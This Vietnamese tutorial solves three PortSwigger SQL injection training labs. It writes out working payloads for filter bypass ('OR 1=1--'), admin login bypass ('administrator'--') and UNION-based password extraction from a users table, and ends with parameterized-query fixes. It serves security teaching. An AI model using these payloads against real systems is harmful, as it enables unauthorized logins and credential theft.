# Hướng Dẫn Thực Hành 05: Đánh Sập Database Với SQL Injection (SQLi)

> **Mục tiêu**: Hiểu bản chất lỗ hổng ghép chuỗi SQL (SQL Concatenation), bẻ khóa mệnh đề WHERE, Bypass form đăng nhập Admin không cần mật khẩu, và khai thác kỹ thuật trích xuất dữ liệu đa bảng bằng **UNION Attack**.

---

## 💡 Tổng Quan: Tại Sao SQL Injection Vẫn Là "Ông Vua" Của Mọi Lỗ Hổng?

Dù ORM (Prisma, Hibernate, Entity Framework, GORM) ngày nay rất phổ biến, SQL Injection vẫn xuất hiện nhan nhản vì:
1. **Dev dùng Raw Query ghép chuỗi**: Khi viết các câu query phức tạp, tìm kiếm filter linh hoạt hoặc báo cáo thống kê, dev thường phá bỏ ORM để dùng Raw SQL string interpolation (`f"SELECT ... WHERE name = '{userInput}'"`).
2. **Trộn lẫn giữa Dữ liệu (Data) và Mã lệnh (Code)**: Ký tự nháy đơn `'` của kẻ tấn công đóng chuỗi dữ liệu lại, và biến phần còn lại thành mã SQL hợp lệ được Database Engine thực thi.

---

## 🟢 LAB 1: SQL injection in WHERE clause allowing retrieval of hidden data (Khai thác mệnh đề WHERE)
* **Link lab**: [SQL injection in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
* **Mức độ**: Apprentice
* **Mục tiêu**: Khai thác bộ lọc danh mục sản phẩm để hiển thị tất cả sản phẩm ẩn/chưa phát hành (`released = 0`).

### 🔍 Góc nhìn Phân tích:
- **Câu lệnh Backend đang chạy ngầm**:
  ```sql
  SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
  ```
  Dev chỉ muốn hiển thị những món đồ thuộc danh mục được chọn VÀ đã được phát hành (`released = 1`).
- **Tư duy Breaker**: Chèn thêm điều kiện luôn đúng (`OR 1=1`) và dùng dấu comment (`--`) để vô hiệu hóa toàn bộ phần kiểm tra `AND released = 1` phía sau!

### 🛠️ Các bước giải quyết:
1. Mở bài lab, bấm vào một danh mục bất kỳ trên thanh menu (ví dụ: **Gifts**).
2. URL lúc này có dạng:
   `https://<lab-id>.web-security-academy.net/filter?category=Gifts`
3. Sửa tham số `category` trên thanh địa chỉ URL hoặc trong Burp Repeater thành:
   ```text
   Gifts' OR 1=1--
   ```
   *(Khi gửi trên URL, dấu cách và dấu nháy sẽ tự động URL-encode thành: `Gifts'%20OR%201=1--`)*.
4. **Câu lệnh SQL sau khi bị chèn**:
   ```sql
   SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1;
   ```
   *(Vì `1=1` luôn đúng và `--` đã biến phần còn lại thành chú thích, toàn bộ sản phẩm ẩn đều được trả về)*.
5. Bấm Enter / Send ➔ Trang web tải lại hiển thị toàn bộ kho hàng ẩn ➔ **Solved!**

---

## 🟢 LAB 2: SQL injection vulnerability allowing login bypass (Bypass Đăng Nhập)
* **Link lab**: [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
* **Mức độ**: Apprentice
* **Mục tiêu**: Đăng nhập thẳng vào tài khoản `administrator` mà không cần biết mật khẩu.

### 🔍 Góc nhìn Phân tích:
- **Câu lệnh Backend đang chạy ngầm**:
  ```sql
  SELECT * FROM users WHERE username = '$username' AND password = '$password';
  ```
- **Tư duy Breaker**: Nếu nhập username là `administrator'--`, câu SQL sẽ biến thành:
  ```sql
  SELECT * FROM users WHERE username = 'administrator'--' AND password = '...';
  ```
  Phần kiểm tra password bị triệt tiêu hoàn toàn! Database chỉ cần tìm thấy bản ghi có username là `administrator` là cho phép đăng nhập thành công.

### 🛠️ Các bước giải quyết:
1. Mở bài lab, bấm vào **My account** để vào trang đăng nhập.
2. Tại ô **Username**, nhập:
   ```text
   administrator'--
   ```
3. Tại ô **Password**, nhập bất kỳ ký tự nào (ví dụ: `123456`).
4. Bấm nút **Log in**.
5. Bạn được đăng nhập ngay lập tức vào trang quản trị của `administrator` ➔ **Solved!**

---

## 🟢 LAB 3: SQL injection UNION attack, retrieving data from other tables (Trích xuất mật khẩu từ bảng khác)
* **Link lab**: [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
* **Mức độ**: Practitioner
* **Mục tiêu**: Bảng `users` chứa 2 cột `username` và `password`. Dùng kỹ thuật UNION attack để đọc trộm password của `administrator`, sau đó đăng nhập bằng tài khoản này.

### 🔍 Góc nhìn Phân tích:
- **Nguyên tắc vàng của toán tử UNION trong SQL**:
  1. Hai câu lệnh SELECT trước và sau `UNION` **phải có cùng số lượng cột**.
  2. Kiểu dữ liệu của các cột tương ứng **phải tương thích với nhau** (ví dụ chuỗi ký tự text).

### 🛠️ Các bước giải quyết:

#### Bước 1: Dò tìm số lượng cột được trả về
1. Bấm vào một danh mục (ví dụ `Gifts`), bắt request `GET /filter?category=...` và gửi sang **Repeater** (`Ctrl + R`).
2. Thử ghép thêm các cột NULL xem server có trả về 200 hay lỗi 500:
   - Thử 1 cột: `category=Gifts' UNION SELECT NULL--` ➔ Lỗi 500 (chưa khớp số cột).
   - Thử 2 cột: `category=Gifts' UNION SELECT NULL,NULL--` ➔ **Trả về 200 OK!**
   *(Như vậy câu query gốc trả về đúng 2 cột)*.

#### Bước 2: Kiểm tra xem cả 2 cột có nhận dữ liệu dạng Text không
Thử inject chuỗi chữ cái vào 2 vị trí:
```text
category=Gifts' UNION SELECT 'a','b'--
```
Bấm **Send** ➔ Trả về `200 OK` và thấy chữ `a`, `b` in ra trên giao diện HTML. Cả 2 cột đều hiển thị được chuỗi ký tự!

#### Bước 3: Trích xuất username và password từ bảng `users`
Sửa payload thành:
```text
category=Gifts' UNION SELECT username, password FROM users--
```
Bấm **Send** ➔ Cuộn xuống xem kết quả trong phần HTML response, bạn sẽ thấy danh sách tất cả người dùng kèm mật khẩu hiển thị rõ mồn một:
- `administrator : <PASSWORD_ADMIN>`
- `carlos : ...`
- `wiener : ...`

#### Bước 4: Hoàn thành bài Lab
1. Copy chuỗi mật khẩu của `administrator`.
2. Quay lại trình duyệt vào **My account**, đăng nhập bằng `administrator` và mật khẩu vừa trộm được ➔ **Solved!**

---

## 🛡️ Cách Vá Chuẩn SQL Injection Ở Tầng Backend

### 1. Luôn sử dụng Parameterized Queries (Prepared Statements)
Tuyệt đối không cộng chuỗi. Khi dùng tham số hóa, Database Engine sẽ biên dịch cú pháp SQL trước, sau đó mới gắn giá trị vào dưới dạng dữ liệu thuần túy (Data), loại bỏ hoàn toàn khả năng thực thi mã độc.

```go
// Ví dụ Go: Dùng ? placeholder (Prepared Statement)
db.Query("SELECT * FROM users WHERE username = ? AND password = ?", username, password)
```

```javascript
// Ví dụ Node.js (pg / mysql2):
await pool.query('SELECT * FROM users WHERE username = $1', [username]);
```

```csharp
// Ví dụ C# Dapper / Entity Framework:
var user = await connection.QueryFirstOrDefaultAsync<User>(
    "SELECT * FROM Users WHERE Username = @Username", new { Username = username });
```

---

## Checklist Hoàn Thành Của Bạn
- [ ] Giải quyết xong Lab 1: SQL injection in WHERE clause (`' OR 1=1--`).
- [ ] Giải quyết xong Lab 2: SQL injection login bypass (`administrator'--`).
- [ ] Giải quyết xong Lab 3: SQL injection UNION attack (Trích xuất password bảng `users`).
